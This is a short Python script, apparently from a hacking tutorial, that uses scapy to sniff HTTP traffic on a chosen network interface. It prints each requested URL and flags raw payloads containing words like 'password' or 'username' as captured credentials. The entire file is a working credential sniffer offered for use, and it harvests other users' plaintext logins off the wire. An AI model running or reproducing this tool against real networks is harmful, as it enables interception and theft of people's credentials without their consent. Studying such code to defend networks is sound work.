import scapy.all as scapy
from scapy_http import http
from ifparser import Ifcfg
import commands

def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    print("in GC")
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "password", "username", "user", "pass","name"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url)
        credentials = get_credentials(packet)
        if credentials:
            print("[+] Possible username/passowrd " + credentials + "\n\n")

ifdata = Ifcfg(commands.getoutput('sudo ifconfig -a'))
i=0
while(i!= len(ifdata.interfaces)):
    print("		["+str(i)+"] "+ifdata.interfaces[i])
    i = i+1
print("\n")
interface = int(raw_input("     Select Interface : "))
sniff_packet(ifdata.interfaces[interface])
